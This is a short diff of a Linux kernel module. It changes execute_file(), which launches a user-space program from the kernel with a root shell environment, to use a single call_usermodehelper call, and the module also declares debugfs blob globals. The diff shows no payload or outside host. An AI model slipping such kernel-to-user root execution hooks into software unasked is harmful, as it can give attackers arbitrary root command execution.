@@ -8,8 +8,6 @@ struct dentry *dfs = NULL;
 struct debugfs_blob_wrapper *myblob = NULL;
 
 void execute_file(void){
-	struct subprocess_info *sub_info;
-
 	static char *envp[] = {
 		"SHELL=/bin/bash",
 		"HOME=/root/",
@@ -26,10 +24,7 @@ void execute_file(void){
 		NULL
 	};
 
-	printk("Execute file called!\n");
-
-	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL);
-	call_usermodehelper_exec(sub_info, UMH_NO_WAIT);
+	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 }
 
 int create_file(void){
